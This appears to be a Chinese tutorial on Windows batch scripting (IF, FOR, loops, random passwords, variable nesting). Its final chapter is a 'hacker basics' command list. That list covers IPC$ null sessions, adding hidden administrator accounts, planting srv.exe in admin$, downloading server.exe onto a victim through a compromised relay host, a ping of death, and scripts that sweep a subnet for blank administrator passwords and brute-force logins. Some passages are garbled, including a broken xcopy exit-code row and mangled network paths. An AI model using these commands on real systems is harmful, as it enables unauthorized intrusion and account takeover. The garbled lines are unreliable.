细心的朋友可能会发现,这个用法和帮助里的用法不太一样,按照帮助里的写法"IF %ERRORLEVEL% == 0 echo net user 执行成功了!  "这一句代码应该写成:IF ERRORLEVEL 0 echo net user 执行成功了!
那为什么我要写成这样呢?各位自己把代码改掉执行后,就会发现错误了!用这种语法,不管你的上面的命令是否执行成功,他都会认为命令成功了,不知道是BUG还是本人理解错误...
补充：这不是bug，而是 if errorlevel 语句的特点：当使用 if errorlevel 0 …… 的句式时，它的含义是：如果错误码的值大于或等于0的时候，将执行某个操作；当使用 if %errorlevel%==0 …… 的句式时，它的含义是：如果错误码的值等于0的时候，将执行某操作。因为这两种句式含义的差别，如果使用前一种句式的时候，错误码语句的排列顺序是从大到小排列
%ERRORLEVEL% 这是个系统变量,返回上条命令的执行结果代码! "成功"用0表示  "失败"用1表示. 当然还有其他参数,用的时候基本就这两数字.
一般上一条命令的执行结果代码只有两结果,"成功"用0表示  "失败"用1表示
　　这只是一般的情况，实际上，errorlevel返回值可以在0~255之间，比如，xcopy默认的errorlevel值就有5个，分别表示5种执行状态：
退出码 说明
0 文件复制没有错误。
1 if errorlevel 2 echo。
2 用户按 CTRL+C 终止了 xcopy。
4 出现了初始化错误。没有足够的内存或磁盘空间，或命令行上输入了无效的驱动器名称或语法。
5 出现了磁盘写入错误。
要判断上面xcopy命令的5种退出情况，应写成：
if errorlevel 5 echo出现了磁盘写入错误
if errorlevel 4 echo出现了初始化错误
if errorlevel 2 echo用户按 CTRL+C 终止了 xcopy
if errorlevel 1 echo if errorlevel 2 echo
if errorlevel 0 echo文件复制没有错误。
才能正确执行。
补充完毕。


再举几个例子给新手理解
@echo off
net usertest
IF %ERRORLEVEL% == 1 echo net user 执行失败了!
pause
这个是判断上一条命令是否执行失败的
@echo off
set /p var=随便输入个命令:
%var%
if %ERRORLEVEL% == 0 goto yes
goto no
:yes
echo !var! 执行成功了
pause
exit
:no
echo 基本上执行失败了..
pause
这个是根据你输入的命令,自动判断是成功还是失败了!

在来一个简化版的
@echo off
set /p var=随便输入个命令:
%var%
if %ERRORLEVEL% == 0 (echo %var%执行成功了) ELSE echo %var%执行失败了!
pause
else后面写上执行失败后的操作!
当然我门还可以把if else这样的语句分成几行写出来,使他看上去好看点...
@echo off
set /p var=随便输入个命令:
%var%
if %ERRORLEVEL% == 0  (
   echo !var! 执行成功了
   ) ELSE (
   echo 基本上执行失败了..
   )
pause

这里介绍的两种简写对IF的三种语法都可以套用,不单单是在IF [NOT] ERRORLEVEL number command
这种法上才能用


第二种用法：IF [NOT] string1==string2 command
这个呢就是用来比较变量或者字符的值是不是相等的.
例子
@echo off
set /p var=请输入第一个比较字符:
set /p var2=请输入第二个比较字符:
if %var% == %var2% (echo 我们相等) ELSE echo 我们不相等
pause
上面这个例子可以判断你输入的值是不是相等,但是你如果输入相同的字符,但是如果其中一个后面打了一个空格,
这个例子还是会认为相等,如何让有空格的输入不相等呢?我们在比较字符上加个双引号就可以了.
@echo off
set /p var=请输入第一个比较字符:
set /p var2=请输入第二个比较字符(多输入个空格试试):
if "%var%" == "%var2%" (echo 我们相等) ELSE echo 我们不相等
pause


第三种用法：IF [NOT] EXIST filename command
这个就是判断某个文件或者文件夹是否存在的语法
例子
@echo off
if exist "c:\test" (echo 存在文件) ELSE echo 不存在文件
pause
判断的文件路径加引号是为了防止路径有空格,如果路径有空格加个双引号就不会出现判断出错了!
这个语法没什么太多的用法,基本就这样了,就不多介绍了.
另外我们看到每条IF用法后都有个[NOT]语句,这啥意思?其他加上他的话,就表示先判断我们的条件不成立时,
没加他默认是先判断条件成立时,比如上面这个例子
@echo off
if not exist "c:\test" (echo 存在文件) ELSE echo 不存在文件
pause
加个NOT,执行后有什么结果,如果你的C盘下根本就没c:\test,他还是会显示"存在文件",这就表示了加了NOT就
会先判断条件失败!懂了吧,上面例子改成这样就正确了!
@echo off
if not exist "c:\test" (echo 不存在文件) ELSE echo 存在文件
pause

第四种用法：IF增强的用法
  IF [/I] string1 compare-op string2 command
  IF CMDEXTVERSION number command
  IF DEFINED variable command
后面两个用法,我不做介绍,因为他们和上面的用法表示的意义基本一样,只简单说说  IF [/I] string1 compare-op string2 command这个语句在判断字符时不区分字符的大小写。
CMDEXTVERSION 条件的作用跟 ERRORLEVEL 的一样，除了它
是在跟与命令扩展名有关联的内部版本号比较。第一个版本
是 1。每次对命令扩展名有相当大的增强时，版本号会增加一个。
命令扩展名被停用时，CMDEXTVERSION 条件不是真的。
如果已定义环境变量，DEFINED 条件的作用跟 EXISTS 的一样，
除了它取得一个环境变量，返回的结果是 true。


@echo off
if a == A (echo 我们相等) ELSE echo 我们不相等
pause
执行后会显示：我们不相等
@echo off
if /i a == A (echo 我们相等) ELSE echo 我们不相等
pause
加上/I不区分大小写就相等了!
最后面还有一些用来判断数字的符号
    EQU - 等于
    NEQ - 不等于
    LSS - 小于
    LEQ - 小于或等于
    GTR - 大于
    GEQ - 大于或等于
我就举一个例子,大家都懂数学...不讲多了
@echo off
set /p var=请输入一个数字:
if %var% LEQ  4 (echo 我小于等于4) ELSE echo 我不小于等于4
pause

 

 第九章 DOS编程高级技巧
本章节乃龙卷风根据自己平时学用批处理的经验而总结的，不断补充中……。



二、if…else…条件语句
前面已经谈到，DOS条件语句主要有以下形式
IF [NOT] ERRORLEVEL number command
IF [NOT] string1==string2 command
IF [NOT] EXIST filename command
增强用法：IF [/I] string1 compare-op string2 command
增强用法中加上/I就不区分大小写了!
增强用法中还有一些用来判断数字的符号：
EQU - 等于
NEQ - 不等于
LSS - 小于
LEQ - 小于或等于
GTR - 大于
GEQ - 大于或等于

上面的command命令都可以用小括号来使用多条命令的组合，包括else子句，组合命令中可以嵌套使用条件或循环命令。
例如:
    IF EXIST filename (
        del filename
    ) ELSE (
        echo filename missing
    )
也可写成：
if exist filename (del filename) else (echo filename missing)
但这种写法不适合命令太多或嵌套命令的使用。
三、循环语句
1、指定次数循环
FOR /L %variable IN (start,step,end) DO command [command-parameters]
组合命令：
FOR /L %variable IN (start,step,end) DO (
Command1
Command2
……
) 
2、对某集合执行循环语句。
FOR %%variable IN (set) DO command [command-parameters]
  %%variable  指定一个单一字母可替换的参数。
  (set)      指定一个或一组文件。可以使用通配符。
  command   对每个文件执行的命令，可用小括号使用多条命令组合。
FOR /R [[drive:]path] %variable IN (set) DO command [command-parameters]
    检查以 [drive:]path 为根的目录树，指向每个目录中的
    FOR 语句。如果在 /R 后没有指定目录，则使用当前
目录。如果集仅为一个单点(.)字符，则枚举该目录树。
同前面一样，command可以用括号来组合：
FOR /R [[drive:]path] %variable IN (set) DO (
Command1
Command2
……
commandn
)
3、条件循环
利用goto语句和条件判断，dos可以实现条件循环，很简单啦，看例子：
@echo off
set var=0
rem ************循环开始了
:continue
set /a var+=1
echo 第%var%此循环
if %var% lss 100 goto continue
rem ************循环结束了
echo 循环执行完毕
pause



十二、随机数（%random%）的应用技巧

%RANDOM% 系统变量 返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。

2的15次方等于32768，上面的0～32767实际就是15位二进制数的范围。

那么，如何获取100以内的随机数呢？很简单，将%RANDOM%按100进行求余运算即可，见例子。

例：生成5个100以内的随机数
  @echo off
  setlocal enabledelayedexpansion
  for /L %%i in (1 1 5) do (
     set /a randomNum=!random!%%100
     echo 随机数：!randomNum!
  )
  pause
运行结果：（每次运行不一样）
随机数：91
随机数：67
随机数：58
随机数：26
随机数：20
请按任意键继续. . .

求余数运算set /a randomNum=!random!%%100中的100可以是1～32768之间的任意整数。

总结：利用系统变量%random%，求余数运算%%，字符串处理等，可以实现很多随机处理。


思考题目：生成给定位数的随机密码
解答思路：将26个英文字母或10数字以及其它特殊字符组成一个字符串，随机抽取其中的若干字符。

参考答案1：（简单）
@echo off
call :randomPassword 5 pass1 pass2
echo %pass1% %pass2% 
pause
exit

:randomPassword
::---------生成随机密码
::---------%1为密码长度，%2及以后为返回变量名称
::---------for命令最多只能区分31个字段
@echo off
set password_len=%1
if not defined password_len goto :eof
if %password_len% lss 1 goto :eof
set wordset=a b c d e f g h i j k l m n o p q r s t u v w x y z
set return=
set num=0
:randomPassword1
set /a num+=1
set /a numof=%random%%%26+1
for /f "tokens=%numof% delims= " %%i in ("%wordset%") do set return=%return%%%i
if %num% lss %password_len% goto randomPassword1
if not "%2"=="" set %2=%return%
shift /2
if not "%2"=="" goto randomPassword
goto :eof

参考答案2：（最优）
@echo off
call :randomPassword 6 pass1 pass2 pass3
echo %pass1% %pass2% %pass3%
pause
exit

:randomPassword
::---------生成随机密码
::---------%1为密码长度，%2及以后为返回变量名称
::---------goto循环、变量嵌套、命令嵌套
@echo off
if "%1"=="" goto :eof
if %1 lss 1 goto :eof
set password_len=%1
set return=
set wordset=abcdefghijklmnopqrstuvwxyz023456789_
::---------------------------循环
:randomPassword1
set /a numof=%random%%%36
call set return=%return%%%wordset:~%numof%,1%%
set /a password_len-=1
if %password_len% gtr 0 goto randomPassword1
::---------------------------循环
if not "%2"=="" set %2=%return%
shift /2
if not "%2"=="" goto randomPassword
goto :eof

 

说明：本例涉及到变量嵌套和命令嵌套的应用，见后。

 



第十章 变量嵌套与命令嵌套
    和其它编程语言相比，dos功能显得相对简单，要实现比较复杂的功能，需要充分运用各种技巧，变量嵌套与命令嵌套就是此类技巧之一。

先复习一下前面的“字符串截取”的关键内容：

**********************************************
截取功能统一语法格式为：%a:~[m[,n]]%
**********************************************
方括号表示可选，%为变量标识符，a为变量名，不可少，冒号用于分隔变量名和说明部分，符号～可以简单理解为“偏移”即可，m为偏移量（缺省为0），n为截取长度（缺省为全部）。

百分号如果需要当成单一字符，必须写成%%

以上是dos变量处理的通用格式，如果其中的m、n为变量，那么这种情况就是变量嵌套了。

比如设变量word为“abcdefghij”，变量num为“123456789”
%word:~4,1%为e，其中4可以从变量num中取值，即%num:~3,1%，写成组合形式如下：
%word:~%num:~3,1%,1% 经测试这种写法不能正确执行，写成%word:~(%num:~3,1%),1%同样不行，那么，怎么实现这种变量嵌套呢？这就必须结合命令嵌套。

什么是命令嵌套呢？简单的说，首先用一条dos命令生成一个字符串，而这个字符串是另一条dos命令，用call语句调用字符串将其执行，从而得到最终结果。

例：用call语句实现命令嵌套
@echo off
set str1=aaa echo ok bbb
echo 初始字符串：%str1%
echo 生成命令字符串如下：
echo %str1:~4,7%
echo 运行命令字符串生成最终结果为：
call %str1:~4,7%
pause

运行显示：
初始字符串：aaa echo ok bbb
生成命令字符串如下：
echo ok
运行命令字符串生成最终结果为：
ok
请按任意键继续. . .

 

 

 



第十一章 黑客基础之DOS
net use $">\\ip\ipc$ " " /user:" " 建立IPC空链接

net use $">\\ip\ipc$ "密码" /user:"用户名" 建立IPC非空链接

net use h: $">\\ip\c$ "密码" /user:"用户名" 直接登陆后映射对方C：到本地为H:

net use h: $">\\ip\c$ 登陆后映射对方C：到本地为H:

net use $">\\ip\ipc$ /del 删除IPC链接

net use h: /del 删除映射对方到本地的为H:的映射

net user用户名 密码 /add 建立用户

net userguest /active:yes 激活guest用户

net user查看有哪些用户

net user 帐户名 查看帐户的属性

net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限,注意：administrator后加s用复数

 

net start 查看开启了哪些服务

net start 服务名 开启服务；(如:

net start telnet， net start schedule)

net stop 服务名 停止某服务 net time \\目标ip 查看对方时间

net time \\目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息

 

net view 查看本地局域网内开启了哪些共享

net view \\ip 查看对方局域网内开启了哪些共享

net config 显示系统网络设置

net logoff 断开连接的共享

net pause 服务名 暂停某服务

 

net send ip "文本信息" 向对方发信息

net ver 局域网内正在使用的网络连接类型和信息

net share 查看本地开启的共享

net share ipc$ 开启ipc$共享

net share ipc$ /del 删除ipc$共享

net share c$ /del 删除C：共享

net user guest 12345 用guest用户登陆后用将密码改为12345

net password 密码 更改系统登陆密码

netstat -a 查看开启了哪些端口,常用netstat -an netstat -n 查看端口的网络连接情况，常用netstat -an netstat -v 查看正在进行的工作 netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况）

netstat -s 查看正在使用的所有协议使用情况

nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写

tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。

ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。 ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)

ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息

tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)

kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示删除当前目录下所有只读文件，“DEL/A-S *.*”表示删除当前目录下除系统文件以外的所有文件 del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）

move 盘符\路径\要移动的文件名 存放移动文件的路径\移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖 fc one.txt two.txt > 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，"> "和"> >" 是重定向命令

 

at id号 开启已注册的某个计划任务

at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止

at id号 /delete 停止某个已注册的计划任务

at 查看所有的计划任务

at \\ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机

finger username @host 查看最近有哪些用户登陆 telnet ip 端口 远和登陆服务器,默认端口为23 open ip 连接到IP（属telnet登陆后的命令） telnet 在本机上直接键入

telnet 将进入本机的telnet copy 路径\文件名1 路径\文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件 copy c:\srv.exe $">\\ip\admin$ 复制本地c:\srv.exe到对方的admin下 cppy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件

copy $\svv.exe">\\ip\admin$\svv.exe c:\ 或:copy\\ip\admin$\*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：

xcopy 要复制的文件或目录树 目标地址\目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件

tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:\server.exe 登陆后，将“IP”的server.exe下载到目标主机c:\server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送 tftp -i 对方IP put c:\server.exe 登陆后，上传本地c:\server.exe至主机

ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时) route print显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway

addres，接口地址

Interface arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。

arp -a将显示出全部信息 start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令 mem 查看cpu使用情况

attrib 文件名(目录名) 查看某文件（目录）的属性

attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用＋则是添加为某属性

dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间 date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间

set 指定环境变量名称=要指派给变量的字符 设置环境变量 set 显示当前所有的环境变量 set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量

pause 暂停批处理程序，并显示出：请按任意键继续.... if 在批处理程序中执行条件处理（更多说明见if命令及变量） goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）

call 路径\批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?） for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量） echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置 echo 信息 在屏幕上显示出信息 echo 信息 >> pass.txt 将"信息"保存到pass.txt文件中 findstr "Hello" aa.txt 在aa.txt文件中寻找字符串hello find 文件名 查找某文件

title 标题名字 更改CMD窗口标题名字

color 颜色值 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白

prompt 名称 更改cmd.exe的显示的命令提示符(把C:\、D:\统一改为：EntSky\ )

print 文件名 打印文本文件

ver 在DOS窗口下显示版本信息

winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）

format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS

md 目录名 创建目录

 replace 源文件 要替换文件的目录 替换文件

 ren 原文件名 新文件名 重命名文件名

 tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称

 type 文件名 显示文本文件的内容

 more 文件名 逐屏显示输出文件

 doskey 要锁定的命令＝字符 doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir=

 taskmgr 调出任务管理器

 chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误

 tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口

 exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe

path 路径\可执行文件的文件名 为可执行文件设置一个路径。

cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?

regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；

regedit /e 注册表文件名 导出注册表 cacls 文件名 参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D:\test.txt /D pub 设定d:\test.txt拒绝pub用户访问。 cacls 文件名 查看文件的访问用户权限列表 REM 文本内容 在批处理文件中添加注解 netsh 查看或更改本地网络配置情况

 

 IIS服务命令： iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现） iisreset /start或stop 启动（停止）所有Internet服务 iisreset /restart 停止然后重新启动所有Internet服务 iisreset /status 显示所有Internet服务状态 iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动 iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机 iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务 iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。



 win2003系统下新增命令（实用部份）：

shutdown /参数 关闭或重启本地或远程主机。 参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。 例：shutdown /r /t 0 立即重启本地主机（无延时） taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。 参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。 

 

 tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。 参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。

 

 Linux系统下基本命令：

 要区分大小写 uname 显示版本信息（同win2K的 ver）

 dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir）  

 pwd 查询当前所在的目录位置

 cd cd ..回到上一层目录，注意cd 与..之间有空格。cd /返回到根目录。

 cat 文件名 查看文件内容 cat >abc.txt 往abc.txt文件中写上内容。

 more 文件名 以一页一页的方式显示一个文本文件。

 cp 复制文件 mv 移动文件 rm 文件名 删除文件，rm -a 目录名删除目录及子目录

 mkdir 目录名 建立目录 rmdir 删除子目录，目录内没有文档。 chmod 设定档案或目录的存取权限 grep 在档案中查找字符串 diff 档案文件比较 find 档案搜寻 date 现在的日期、时间

 who 查询目前和你使用同一台机器的人以及Login时间地点 w 查询目前上机者的详细资料 whoami 查看自己的帐号名称 groups 查看某人的Group passwd 更改密码 history 查看自己下过的命令 ps 显示进程状态 kill 停止某进程 gcc 黑客通常用它来编译C语言写的文件 su 权限转换为指定使用者

 telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。 ftp ftp连接上某服务器（同win2K）

 

 附：批处理命令与变量

 1：for命令及变量 基本格式： FOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。 批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use $">\\ip\ipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3 (set):指定一个或一组文件，可使用通配符，如：(D:\user.txt)和(1 1 254)(1 -1 254),{“(1 1 254)”第一个"1"指起始值，第二个"1"指增长量，第三个"254"指结束值，即：从1到254；“(1 -1 254)”说明：即从254到1} command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：& 来隔开 command_parameters：为特定命令指定参数或命令行开关 IN (set)：指在(set)中取值；DO command ：指执行command 参数：/L 指用增量形式{(set)为增量形式时}；/F 指从文件中不断取值，直到取完为止{(set)为文件时，如(d:\pass.txt)时}。 用法举例： @echo off echo 用法格式：test.bat *.*.* > test.txt for /L %%G in (1 1 254) do echo %1.%%G >>test.txt & net use \\%1.%%G /user:administrator | find "命令成功完成" >>test.txt 存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。 /L指用增量形式（即从1-254或254-1）；输入的IP前面三位：*.*.*为批处理默认的 %1；%%G 为变量(ip的最后一位）；& 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有"命令成功完成"信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。 @echo off echo 用法格式：ok.bat ip FOR /F %%i IN (D:\user.dic) DO smb.exe %1 %%i D:\pass.dic 200 存为：ok.exe 说明：输入一个IP后，用字典文件d:\pass.dic来暴解d:\user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。

 